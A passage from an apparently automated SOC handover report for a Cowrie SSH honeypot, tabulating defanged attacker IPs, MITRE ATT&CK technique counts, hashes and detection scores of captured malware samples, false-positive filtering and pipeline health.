| `124.123.148[.]252` | 1 | 2026-06-17 11:19 | 2026-06-17 11:19 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `132.145.27[.]125` | 1 | 2026-06-17 13:41 | 2026-06-17 13:41 | 30s | 0 | `T1592` | 🟢 LOW |
| `134.175.168[.]62` | 1 | 2026-06-17 15:11 | 2026-06-17 15:11 | 30s | 0 | `T1592` | 🟢 LOW |
| `14.103.111[.]110` | 1 | 2026-06-17 13:44 | 2026-06-17 13:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `140.245.122[.]92` | 1 | 2026-06-17 15:07 | 2026-06-17 15:08 | 30s | 0 | `T1592` | 🟢 LOW |
| `157.230.150[.]187` | 1 | 2026-06-17 11:55 | 2026-06-17 11:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.216.145[.]188` | 1 | 2026-06-17 11:55 | 2026-06-17 11:55 | 1s | 0 | `T1592` | 🟢 LOW |
| `188.36.7[.]196` | 1 | 2026-06-17 11:49 | 2026-06-17 11:49 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `198.12.150[.]45` | 1 | 2026-06-17 15:12 | 2026-06-17 15:13 | 31s | 0 | `T1592` | 🟢 LOW |
| `198.176.55[.]172` | 1 | 2026-06-17 11:13 | 2026-06-17 11:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `199.45.154[.]147` | 1 | 2026-06-17 11:08 | 2026-06-17 11:08 | 15s | 0 | `T1592` | 🟢 LOW |
| `218.13.214[.]18` | 1 | 2026-06-17 15:37 | 2026-06-17 15:37 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.21.182[.]228` | 1 | 2026-06-17 14:52 | 2026-06-17 14:52 | 30s | 0 | `T1592` | 🟢 LOW |
| `222.110.147[.]58` | 1 | 2026-06-17 12:17 | 2026-06-17 12:17 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `23.225.228[.]26` | 1 | 2026-06-17 12:04 | 2026-06-17 12:05 | 30s | 0 | `T1592` | 🟢 LOW |
| `24.122.136[.]94` | 1 | 2026-06-17 11:28 | 2026-06-17 11:28 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `36.134.208[.]91` | 1 | 2026-06-17 14:37 | 2026-06-17 14:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `39.126.101[.]130` | 1 | 2026-06-17 13:54 | 2026-06-17 13:55 | 13s | 0 | `T1592` | 🟢 LOW |
| `4.186.40[.]232` | 1 | 2026-06-17 12:45 | 2026-06-17 12:45 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.152[.]247` | 1 | 2026-06-17 13:18 | 2026-06-17 13:18 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `5.178.101[.]127` | 1 | 2026-06-17 14:00 | 2026-06-17 14:00 | 30s | 0 | `T1592` | 🟢 LOW |
| `52.117.122[.]122` | 1 | 2026-06-17 11:19 | 2026-06-17 11:19 | 30s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]169` | 1 | 2026-06-17 11:51 | 2026-06-17 11:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `79.116.23[.]158` | 1 | 2026-06-17 14:38 | 2026-06-17 14:38 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.138.148[.]235` | 1 | 2026-06-17 14:08 | 2026-06-17 14:09 | 30s | 0 | `T1592` | 🟢 LOW |
| `94.231.206[.]250` | 1 | 2026-06-17 13:59 | 2026-06-17 13:59 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/73** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 43/100 | 🟡 MEDIUM | **34/73** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 44/100 | 🟡 MEDIUM | **35/73** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/73 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `111.70.9[.]143` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 17 |
| `119.45.155[.]29` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 1 |
| `3.17.73[.]23` | US | Amazon Technologies Inc. | **100** ⚠️ | 31 |
| `124.123.148[.]252` | IN | Atria Convergence Technologies Ltd., | **100** ⚠️ | 34 |
| `218.13.214[.]18` | CN | CHINANET Guangdong province network | **100** ⚠️ | 50 |
| `69.5.169[.]169` | DE | Infrawatch Limited | **100** ⚠️ | 17 |
| `12.68.228[.]244` | US | AT&T Enterprises, LLC | **100** ⚠️ | 19 |
| `103.153.4[.]104` | HK | Shenzhen Guocai Electronic Trading Co., Ltd. | **100** ⚠️ | 0 |
| `202.117.56[.]252` | CN | China Education and Research Network | **100** ⚠️ | 3 |
| `94.231.206[.]250` | SG | FR ONYPHE | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 47 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 24 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 6 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |

---

## 🔕 False Positive Summary (16 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 22 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 15 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 119 cases |
| Tool 34  | Credential Extractor        | ✅ 30 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 62 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 16 filtered (13.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 44 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 6 priority case(s) shown individually · 48 recon entry/entries in table (13 group(s) consolidating 62 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-17T15:42:12Z_
